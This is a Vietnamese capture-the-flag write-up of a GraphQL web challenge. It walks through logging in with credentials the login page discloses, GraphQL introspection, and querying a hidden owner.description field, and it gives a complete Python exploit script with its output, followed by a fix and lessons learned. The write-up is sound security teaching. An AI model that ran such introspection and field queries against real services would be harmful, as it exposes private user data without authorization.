---
title: '[CSSCTF] Web Exploitation: Secret Supernovas'
date: '2026-10-02'
description: Writeup thử thách Web "Secret Supernovas" trong CSSCTF - khai thác lỗ
  hổng GraphQL API để đọc dữ liệu nhạy cảm.
categories: [CSSCTF, Web]
tags: [cssctf, web, graphql, api-security, recon]
series: [CSSCTF 2026]
showAuthor: false
showTableOfContents: true
---

# 🌟 CTF Write-up: Secret Supernovas

**Competition:** CSSCTF  
**Category:** Web  
**Challenge Name:** Secret Supernovas  
**Flag:** `CSSCTF{we_l000ve_grafs}`  
**Difficulty:** Medium  
**Target:** http://34.116.80.78:9982/

---

## 📋 Mô tả Challenge

> This is just a list of stars. Nothing else to see here...

Mô tả cố tình đơn giản để đánh lạc hướng. Thực tế đây là một web app về danh sách các ngôi sao thiên văn, ẩn chứa thông tin bí mật trong một GraphQL API không được bảo vệ đúng cách.

---

## 🔍 Bước 1: Trinh sát ban đầu (Reconnaissance)

### 1.1 Khám phá trang chủ

Truy cập `http://34.116.80.78:9982/` và quan sát response HTML:

```html
<title>Log in · Star City Observatory</title>
...
<main>
  <h1>Login</h1>
  <form method="POST">
    <label>Username <input name="username" .../></label>
    <label>Password <input name="password" .../></label>
    <button type="submit">Log in</button>
  </form>
  <p class="hint">Need an account? <code>cadet/star</code>.</p>
</main>
```

> [!NOTE]
> Trang login **tự lộ credentials** trong phần hint: `cadet/star`. Đây là tài khoản "visitor" với quyền hạn thấp.

**Thông tin thu thập được:**
- Ứng dụng tên: **Star City Observatory**
- Framework: **SvelteKit** (nhận biết qua Svelte logo SVG trong favicon và cấu trúc HTML)
- Có cơ chế login, có thể có phân quyền theo role

---

## 🔐 Bước 2: Đăng nhập và khám phá phiên đăng nhập

### 2.1 Đăng nhập với tài khoản `cadet/star`

```python
import requests

session = requests.Session()

resp = session.post(
    'http://34.116.80.78:9982/login',
    data={'username': 'cadet', 'password': 'star'},
    allow_redirects=False
)
print('Status:', resp.status_code)
# 200
print('Set-Cookie:', resp.headers.get('set-cookie'))
# session=6812e862-...; Max-Age=28800; Path=/; HttpOnly; SameSite=Lax
print('Body:', resp.text)
# {"type":"redirect","status":303,"location":"/"}
```

**Kết quả:** Server trả về JSON redirect thay vì HTTP 303 thực sự (đặc trưng của SvelteKit form actions). Cookie session được set với `HttpOnly; SameSite=Lax`.

### 2.2 Truy cập trang chính sau khi đăng nhập

```python
resp2 = session.get('http://34.116.80.78:9982/')
print(resp2.text)
```

HTML trả về chứa thông tin user trong SvelteKit data:

```javascript
kit.start(app, element, {
    node_ids: [0, 2],
    data: [{
        type: "data",
        data: {
            user: {id: 10, first_name: "Cadet", last_name: "Visitor"}
        },
        uses: {}
    }, ...]
});
```

> [!IMPORTANT]
> User `cadet` có **id = 10**, tên "Cadet Visitor". Đây là account dạng visitor với quyền hạn thấp nhất.

Trang chính hiển thị `"Aligning telescope…"` — dữ liệu ngôi sao được load **asynchronously** bởi JavaScript, không phải server-side render. Điều này gợi ý có một **API endpoint riêng biệt** để fetch dữ liệu.

---

## 🕵️ Bước 3: Phân tích JavaScript Bundle

### 3.1 Xác định các file JS

SvelteKit cung cấp manifest các file JS trong entry point:

```javascript
// /_app/immutable/entry/app.JEDSD3tx.js
const __vite__mapDeps = (i, m=__vite__mapDeps, d=(m.f||(m.f=[
    "../nodes/0.CKVBBlK7.js",
    "../chunks/DdOvFIKB.js",
    "../chunks/xihTtKlq.js",
    "../assets/0.DXnTN1b8.css",
    "../nodes/1.CTC9N2L_.js",
    "../chunks/CU-I4PXI.js",
    "../nodes/2.C521ycad.js",    // <-- trang chính (Stars)
    "../assets/2.Df5bwoDh.css",
    "../nodes/3.BbGUoTEM.js",    // <-- trang login
    "../assets/3.DTxWb2OH.css"
]))) => i.map(i => d[i]);
```

Route mapping:

```javascript
var I = {
    "/":      [-3],   // node 2 = Stars page
    "/login": [-4]    // node 3 = Login page
};
```

### 3.2 Phân tích node 2 — Trang Stars (quan trọng nhất!)

Tải file `/_app/immutable/nodes/2.C521ycad.js` và tìm được đoạn code critical:

```javascript
m(async () => {
    let e = await (await fetch(`/graphql`, {
        method: `POST`,
        headers: {"content-type": `application/json`},
        body: JSON.stringify({
            query: `query Stars {
              stars { id name spectralClass magnitude classification galaxy { name } }
            `}
        })
    })).json();

    e.errors
        ? a(D, e.errors[0].message, !0)
        : a(E, e.data.stars, !0)
});
```

> [!IMPORTANT]
> **Phát hiện mấu chốt:** Ứng dụng sử dụng **GraphQL** tại endpoint `/graphql`. Query chỉ request một số field nhất định (`id name spectralClass magnitude classification galaxy`), nhưng server có thể có nhiều field hơn không được UI hiển thị!

---

## 🔬 Bước 4: Khai thác GraphQL

### 4.1 GraphQL Introspection

GraphQL cung cấp cơ chế **introspection** để tự mô tả schema của mình. Đây là bước đầu tiên khi tấn công một GraphQL API:

```python
def gql(query):
    r = session.post(
        'http://34.116.80.78:9982/graphql',
        headers={'content-type': 'application/json'},
        json={'query': query}
    )
    return r.json()

result = gql('''
{
  __schema {
    queryType { name }
    types {
      name
      kind
      fields(includeDeprecated: true) {
        name
        args { name }
      }
    }
  }
}
''')
```

**Schema đầy đủ được khám phá:**

```
Query type: Query

=== TYPE: Galaxy ===
  - distanceLy
  - id
  - name
  - stars
  - type

=== TYPE: Person ===
  - date_of_birth
  - description       <-- ⚠️ Đáng ngờ!
  - first_name
  - id
  - last_name

=== TYPE: Query ===
  - galaxies
  - galaxy(id: Int)
  - star(id: Int)
  - stars
  - user(id: Int)     <-- ⚠️ Có thể query user bất kỳ!

=== TYPE: Star ===
  - classification
  - galaxy
  - id
  - magnitude
  - name
  - owner             <-- ⚠️ Field ẩn! UI không hiển thị!
  - spectralClass
```

> [!WARNING]
> **Lỗ hổng phát hiện:** Type `Star` có field **`owner`** (kiểu `Person`) KHÔNG được UI hiển thị. Field `Person.description` có thể chứa thông tin nhạy cảm. Đây là dấu hiệu của **Broken Object Property Level Authorization (BOPLA)**.

### 4.2 Khai thác field ẩn `owner.description`

Xây dựng query để lấy toàn bộ thông tin bao gồm field ẩn:

```python
result = gql('''
query Stars {
  stars {
    id
    name
    spectralClass
    magnitude
    classification
    galaxy { id name distanceLy type }
    owner {
      id
      first_name
      last_name
      date_of_birth
      description    # Field không được hiển thị trên UI!
    }
  }
}
''')
```

### 4.3 Kết quả — Tìm thấy Flag!

Response đầy đủ:

```json
{
  "data": {
    "stars": [
      {
        "id": 1, "name": "Arrowhead",
        "owner": {
          "id": 2, "first_name": "Felicity", "last_name": "Smoak",
          "date_of_birth": "1989-07-24",
          "description": "Systems lead. Keeps the telescope array online."
        }
      },
      {
        "id": 2, "name": "Overwatch",
        "owner": { "id": 2, "first_name": "Felicity", ... }
      },
      {
        "id": 3, "name": "Spartan",
        "owner": {
          "id": 3, "first_name": "John", "last_name": "Diggle",
          "description": "Security. Escorts visitors during night sessions."
        }
      },
      {
        "id": 4, "name": "Speedy",
        "owner": {
          "id": 4, "first_name": "Thea", "last_name": "Queen",
          "description": "Junior astronomer. Logged the Speedy transit in June."
        }
      },
      {
        "id": 5, "name": "Black Canary",
        "spectralClass": "B3V",
        "magnitude": 2.12,
        "classification": "main sequence",
        "galaxy": { "name": "Triangulum" },
        "owner": {
          "id": 5,
          "first_name": "Laurel",
          "last_name": "Lance",
          "date_of_birth": "1986-03-09",
          "description": "CSSCTF{we_l000ve_grafs}"   // 🎉 FLAG!
        }
      },
      ...
      {
        "id": 11, "name": "Secret Supernova",   // <-- Tên challenge!
        "spectralClass": "SN Ia",
        "magnitude": -19.3,
        "classification": "supernova",
        "owner": {
          "id": 1, "first_name": "Oliver", "last_name": "Queen",
          "description": "Observatory Director. Approves all new catalogue entries."
        }
      }
    ]
  }
}
```

> [!NOTE]
> Star thứ 11 tên **"Secret Supernova"** chính là easter egg của challenge — tên của bài lab! Nó thuộc về **Oliver Queen** (Observatory Director), nhưng flag lại nằm trong description của **Laurel Lance** — owner của "Black Canary".

---

## 🏆 Flag

```
CSSCTF{we_l000ve_grafs}
```

---

## 📊 Sơ đồ tấn công

```
[Trình duyệt / Script]
        |
        v
[GET /]  -->  Trang Login (lộ credentials: cadet/star)
        |
        v
[POST /login]  -->  Session cookie được cấp
        |
        v
[GET /]  -->  Trang Stars (data load async bằng JS)
        |
        v
[Phân tích JS Bundle]
        |
        +--> /nodes/2.C521ycad.js  -->  fetch('/graphql', ...)
        |                                       |
        v                                       v
[GET /graphql  __schema introspection]   [Phát hiện field ẩn]
        |
        v
[POST /graphql  stars { owner { description } }]
        |
        v
[Flag trong description của Laurel Lance]
CSSCTF{we_l000ve_grafs}
```

---

## 🛡️ Phân tích lỗ hổng bảo mật

### Loại lỗ hổng: BOPLA + GraphQL Exposure

**OWASP API3:2023 — Broken Object Property Level Authorization**

| Yếu tố | Chi tiết |
|--------|----------|
| **Vector** | GraphQL field `owner.description` không được phân quyền |
| **Điều kiện khai thác** | Chỉ cần đăng nhập (account `cadet` với quyền thấp nhất) |
| **Dữ liệu bị lộ** | Thông tin nhạy cảm trong `description` của `Person` |
| **Nguyên nhân gốc** | UI chỉ request một subset fields, nhưng server không enforce authorization ở field level |

### Tại sao lỗi xảy ra?

1. **UI chỉ query một phần**: Frontend request `stars { id name spectralClass magnitude classification galaxy { name } }` — không có `owner`
2. **Server không kiểm tra field-level access**: Bất kỳ authenticated user nào cũng có thể thêm `owner { description }` vào query
3. **GraphQL Introspection bật**: Cho phép attacker biết toàn bộ schema, bao gồm các field "ẩn"

### Cách fix đúng đắn

```javascript
// Ví dụ fix với graphql-shield (Node.js)
const permissions = shield({
    Query: {
        stars: isAuthenticated,
    },
    Star: {
        owner: isAdmin,         // Chỉ admin mới xem được owner
    },
    Person: {
        description: isOwnerOrAdmin,  // Chỉ chính chủ hoặc admin
        date_of_birth: isOwnerOrAdmin,
    }
});

// Hoặc disable introspection trong production:
const server = new ApolloServer({
    introspection: process.env.NODE_ENV !== 'production',
});
```

---

## 🧰 Script khai thác hoàn chỉnh

```python
#!/usr/bin/env python3
"""
CTF Write-up: Secret Supernovas
Target: http://34.116.80.78:9982/
Vulnerability: GraphQL BOPLA (Broken Object Property Level Authorization)
Flag: CSSCTF{we_l000ve_grafs}
"""

import requests
import json
import sys

sys.stdout.reconfigure(encoding='utf-8')

TARGET = 'http://34.116.80.78:9982'
session = requests.Session()


def login(username: str, password: str) -> bool:
    """Đăng nhập và lưu session cookie."""
    resp = session.post(
        f'{TARGET}/login',
        data={'username': username, 'password': password},
        allow_redirects=False
    )
    return resp.status_code == 200


def gql(query: str) -> dict:
    """Gửi GraphQL query."""
    r = session.post(
        f'{TARGET}/graphql',
        headers={'content-type': 'application/json'},
        json={'query': query}
    )
    return r.json()


def get_schema() -> None:
    """Introspect GraphQL schema để tìm field ẩn."""
    result = gql('''
    {
      __schema {
        types {
          name kind
          fields(includeDeprecated: true) {
            name
            args { name }
          }
        }
      }
    }
    ''')
    types = result['data']['__schema']['types']
    for t in types:
        if not t['name'].startswith('__') and t.get('fields'):
            print(f"\nType: {t['name']}")
            for f in t['fields']:
                args = ', '.join(a['name'] for a in f.get('args', []))
                print(f"  - {f['name']}" + (f"({args})" if args else ''))


def find_flag() -> str:
    """Khai thác field owner.description để tìm flag."""
    result = gql('''
    query Stars {
      stars {
        id name
        owner {
          id first_name last_name
          date_of_birth
          description
        }
      }
    }
    ''')

    for star in result['data']['stars']:
        desc = star['owner']['description']
        if 'CSSCTF{' in desc:
            print(f"[+] Flag found in star '{star['name']}' "
                  f"owned by {star['owner']['first_name']} {star['owner']['last_name']}!")
            return desc
    return None


def main():
    print("[*] Step 1: Login with leaked credentials cadet/star")
    if login('cadet', 'star'):
        print(f"[+] Logged in! Session: {dict(session.cookies)}")
    else:
        print("[-] Login failed")
        return

    print("\n[*] Step 2: GraphQL Introspection - finding hidden fields")
    get_schema()

    print("\n[*] Step 3: Exploiting hidden owner.description field")
    flag = find_flag()

    if flag:
        print(f"\n{'='*50}")
        print(f"🏆 FLAG: {flag}")
        print(f"{'='*50}")
    else:
        print("[-] Flag not found")


if __name__ == '__main__':
    main()
```

**Output khi chạy:**

```
[*] Step 1: Login with leaked credentials cadet/star
[+] Logged in! Session: {'session': '832cdb89-...'}

[*] Step 2: GraphQL Introspection - finding hidden fields

Type: Galaxy
  - distanceLy
  - id
  - name
  - stars
  - type

Type: Person
  - date_of_birth
  - description
  - first_name
  - id
  - last_name

Type: Query
  - galaxies
  - galaxy(id)
  - star(id)
  - stars
  - user(id)

Type: Star
  - classification
  - galaxy
  - id
  - magnitude
  - name
  - owner          <-- Hidden field!
  - spectralClass

[*] Step 3: Exploiting hidden owner.description field
[+] Flag found in star 'Black Canary' owned by Laurel Lance!

==================================================
🏆 FLAG: CSSCTF{we_l000ve_grafs}
==================================================
```

---

## 📚 Bài học rút ra

1. **Không bao giờ tin tưởng vào UI để che giấu dữ liệu**: Nếu dữ liệu tồn tại trong database và API có thể truy xuất được, nó không được coi là "ẩn".

2. **GraphQL introspection nên tắt trong production**: Nó tiết lộ toàn bộ schema, giúp attacker biết chính xác cần query field nào.

3. **Field-level authorization là bắt buộc**: Không chỉ protect query/mutation, mà cần protect từng field trong từng type.

4. **Credentials trong source code/UI là cực kỳ nguy hiểm**: Dù là "test account", việc lộ `cadet/star` cho phép kẻ tấn công có điểm xuất phát để khám phá.

5. **Phân tích JS bundle là kỹ thuật quan trọng**: Modern SPA thường chứa API endpoints, logic business trong bundle — attacker luôn đọc JS trước khi tấn công.

